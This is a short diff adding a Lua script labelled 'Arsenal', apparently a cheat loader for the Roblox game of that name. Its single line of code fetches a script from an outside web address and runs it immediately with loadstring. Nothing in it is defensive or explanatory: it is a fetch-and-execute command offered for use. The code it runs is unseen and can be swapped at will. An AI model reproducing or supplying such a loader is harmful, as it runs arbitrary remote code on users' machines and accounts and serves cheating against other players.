@@ -1,0 +1,2 @@
+-- Arsenal 
+loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/3641b98ac581444eab7fc0016d82fc03"))()
